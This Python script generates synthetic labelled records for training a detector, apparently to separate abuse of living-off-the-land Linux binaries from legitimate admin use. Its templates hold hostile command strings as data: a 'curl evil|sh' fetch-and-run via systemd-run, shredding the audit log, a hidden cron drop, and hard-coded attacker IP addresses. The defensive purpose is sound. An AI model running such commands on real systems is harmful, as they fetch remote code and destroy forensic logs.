#!/usr/bin/env python3
"""Round 6 — living-off-the-land abuse vs legit admin use."""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from pathlib import Path

TS_MIN, TS_MAX = 1749000000, 1781300000
EVIL = ["185.220.101.45:4444", "45.137.21.9:9001"]


def fmt(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
    base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
    if conns:
        base += f" outbound_connections:[{','.join(sorted(conns))}]"
    if files:
        base += f" sensitive_files:[{','.join(sorted(files))}]"
    if kids:
        base += f" spawned_children:[{','.join(sorted(kids))}]"
    if not (conns or files or kids):
        base += " behavior:none_observed"
    return base


TEMPLATES = [
    dict(category="lolbin_abuse", bucket="threat", mitre=["T1053.002", "T1059.004"],
         name="systemd-run", exe="/usr/bin/systemd-run", uid=1000,
         cmd="--unit=evil -- /bin/bash -c 'curl evil|sh'",
         conns=EVIL[:1], kids=["bash"], output="QUARANTINE",
         reasoning="systemd-run spawning shell with remote payload — LOLbin abuse."),
    dict(category="lolbin_abuse", bucket="threat", mitre=["T1053.002"],
         name="at", exe="/usr/bin/at", uid=1000,
         cmd="now + 1 minute", files=["/etc/cron.d/.x"], kids=["sh"], output="QUARANTINE",
         reasoning="at scheduling one-shot malicious job."),
    dict(category="lolbin_abuse", bucket="threat", mitre=["T1546"],
         name="dbus-send", exe="/usr/bin/dbus-send", uid=1000,
         cmd="--system --dest=org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.StartUnit",
         kids=["systemd"], output="QUARANTINE",
         reasoning="dbus-send triggering systemd unit — suspicious automation."),
    dict(category="lolbin_abuse", bucket="threat", mitre=["T1490"],
         name="shred", exe="/usr/bin/shred", uid=0,
         cmd="-uz /var/log/audit/audit.log", files=["/var/log/audit/audit.log"], output="QUARANTINE",
         reasoning="shred on audit log — inhibit recovery / cover tracks."),
    dict(category="lolbin_legit", bucket="legit_scary", mitre=["T1053.002"],
         name="systemd-run", exe="/usr/bin/systemd-run", uid=1000,
         cmd="--user --on-calendar=daily /home/cosmic/Scripts/utilities/daily_report.sh",
         output="ALLOW", reasoning="User timer for known daily script."),
    dict(category="lolbin_legit", bucket="legit_scary", mitre=["T1053.002"],
         name="at", exe="/usr/bin/at", uid=1000,
         cmd="midnight", kids=["bash"], output="ALLOW",
         reasoning="User scheduling own maintenance at midnight."),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--count", type=int, default=400)
    ap.add_argument("--out", default="data/bucket_f_lolbins.jsonl")
    ap.add_argument("--seed", type=int, default=62)
    args = ap.parse_args()
    random.seed(args.seed)
    out = Path(args.out)
    seen, n = set(), 0
    with out.open("w") as f:
        while n < args.count:
            t = random.choice(TEMPLATES)
            rec = {
                "bucket": t["bucket"],
                "category": t["category"],
                "mitre": t["mitre"],
                "tags": ["lolbin", "round6"],
                "input": fmt(t["name"], random.randint(1000, 99999), t["uid"], t["exe"],
                             t["cmd"], random.randint(TS_MIN, TS_MAX),
                             t.get("conns"), t.get("files"), t.get("kids")),
                "output": t["output"],
                "reasoning": t["reasoning"],
            }
            h = hashlib.sha1(rec["input"].encode()).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            f.write(json.dumps(rec) + "\n")
            n += 1
    print(f"[+] {n} lolbin records -> {out}")


if __name__ == "__main__":
    main()
